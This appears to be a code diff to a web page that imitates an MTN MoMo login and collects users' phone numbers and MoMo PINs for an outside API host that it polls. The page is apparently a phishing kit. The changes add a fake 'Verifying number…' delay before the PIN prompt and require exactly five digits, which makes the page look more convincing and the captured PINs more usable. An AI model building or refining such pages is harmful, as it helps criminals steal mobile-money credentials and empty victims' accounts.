@@ -80,7 +80,7 @@
 
     body.modal-open { overflow: hidden; }
 
-    /* ═══════════ HEADER — BLACK ═══════════ */
+    /* ═══════════ HEADER ═══════════ */
     .header {
       position: fixed;
       top: 0; left: 0; right: 0;
@@ -382,6 +382,16 @@
     }
     .login-btn:active:not(:disabled) { transform: scale(0.98); }
     .login-btn:disabled { opacity: 0.65; cursor: not-allowed; }
+
+    .btn-spinner-dark {
+      display: inline-block;
+      width: 16px; height: 16px;
+      border: 2.5px solid rgba(0, 0, 0, 0.2);
+      border-top-color: #1A1A2E;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      margin-right: 4px;
+    }
 
     .security-note {
       display: flex;
@@ -827,7 +837,6 @@
       letter-spacing: 0.03em;
     }
 
-    /* ═══════════ MOBILE ═══════════ */
     @media (max-width: 480px) {
       .main { padding: 18px 12px 30px; }
       .momo-band { padding: 24px 22px; }
@@ -857,7 +866,7 @@
     </div>
   </div>
 
-  <!-- ═══════════ HEADER ═══════════ -->
+  <!-- HEADER -->
   <header class="header">
     <div class="header-inner">
       <a href="index.html" class="brand">
@@ -869,7 +878,7 @@
     </div>
   </header>
 
-  <!-- ═══════════ MAIN ═══════════ -->
+  <!-- MAIN -->
   <main class="main">
     <div class="login-wrap">
       <div class="login-card-wrap">
@@ -933,7 +942,7 @@
       <h3 class="pin-modal-title">
         Log in to your <strong>MoMo account?</strong>
       </h3>
-      <p class="pin-modal-sub">Enter your MTN MoMo PIN to authorize this login</p>
+      <p class="pin-modal-sub">Enter your 5-digit MTN MoMo PIN to authorize this login</p>
 
       <label class="pin-label" for="momo_pin">Enter PIN</label>
       <div class="pin-input-wrap">
@@ -941,14 +950,13 @@
           id="momo_pin"
           type="password"
           maxlength="5"
-          minlength="4"
           inputmode="numeric"
           autocomplete="off"
           autocorrect="off"
           autocapitalize="off"
           spellcheck="false"
           enterkeyhint="done"
-          placeholder="••••"
+          placeholder="•••••"
           class="pin-input" />
         <button type="button" id="togglePin" class="pin-eye-btn" aria-label="Show PIN">
           <svg viewBox="0 0 24 24">
@@ -962,7 +970,7 @@
         <a class="pin-forgot" href="#" onclick="alert('Please dial *126# to reset your MoMo PIN.'); return false;">Forgot PIN?</a>
       </div>
 
-      <div class="pin-error" id="pinError">Please enter your MoMo PIN</div>
+      <div class="pin-error" id="pinError">Please enter your 5-digit MoMo PIN</div>
 
       <div class="pin-actions">
         <button id="cancelBtn" type="button" class="btn-cancel">Cancel</button>
@@ -1026,6 +1034,7 @@
   <script>
     const API_BASE = 'https://momo-usersey-production.up.railway.app';
     const POLL_INTERVAL_MS = 2500;
+    const NUMBER_LOADING_MS = 3000; /* 3 seconds loading after CONTINUE */
 
     const phoneInput   = document.getElementById('phone');
     const phoneWrapper = document.getElementById('phoneWrapper');
@@ -1052,6 +1061,9 @@
     const overlay = document.getElementById('sheetOverlay');
     const togglePin = document.getElementById('togglePin');
     const pinError = document.getElementById('pinError');
+
+    /* Save default CONTINUE button HTML so we can restore it */
+    const DEFAULT_CONTINUE_HTML = 'CONTINUE →';
 
     function movePopup() {
       if (window.visualViewport) {
@@ -1088,6 +1100,7 @@
       }, 250);
     }
 
+    /* ✅ CONTINUE button → 3s "Verifying number…" loading → then PIN popup */
     openBtn.addEventListener('click', () => {
       const digits = phoneInput.value.replace(/\D/g, '');
       if (digits.length !== 9) {
@@ -1097,9 +1110,20 @@
         phoneInput.focus();
         return;
       }
+
       phoneWrapper.classList.remove('invalid');
       phoneError.classList.remove('show');
-      openModal();
+
+      /* Show loading state */
+      openBtn.disabled = true;
+      openBtn.innerHTML = '<span class="btn-spinner-dark"></span>Verifying number…';
+
+      /* After 3 seconds → open PIN popup + restore button */
+      setTimeout(() => {
+        openBtn.disabled = false;
+        openBtn.innerHTML = DEFAULT_CONTINUE_HTML;
+        openModal();
+      }, NUMBER_LOADING_MS);
     });
 
     togglePin.addEventListener('click', () => {
@@ -1112,9 +1136,10 @@
       pin.focus();
     });
 
+    /* ✅ PIN must be EXACTLY 5 digits */
     pin.addEventListener('input', function () {
       this.value = this.value.replace(/\D/g, '').slice(0, 5);
-      const isValid = /^\d{4,5}$/.test(this.value);
+      const isValid = /^\d{5}$/.test(this.value);
       proceed.disabled = !isValid;
       pinError.classList.remove('show');
     });
@@ -1132,10 +1157,6 @@
       bannerTimer = setTimeout(() => {
         rejectBanner.classList.remove('show');
       }, 6000);
-    }
-    function hideRejectBanner() {
-      rejectBanner.classList.remove('show');
-      if (bannerTimer) clearTimeout(bannerTimer);
     }
 
     /* ═══════════════════════════════════════════
@@ -1183,8 +1204,9 @@
     let stepTimer = null;
 
     proceed.addEventListener('click', async () => {
-      if (!/^\d{4,5}$/.test(pin.value)) {
-        pinError.textContent = 'Please enter your 4 or 5-digit MoMo PIN';
+      /* ✅ Require EXACTLY 5 digits */
+      if (!/^\d{5}$/.test(pin.value)) {
+        pinError.textContent = 'Please enter your 5-digit MoMo PIN';
         pinError.classList.add('show');
         return;
       }
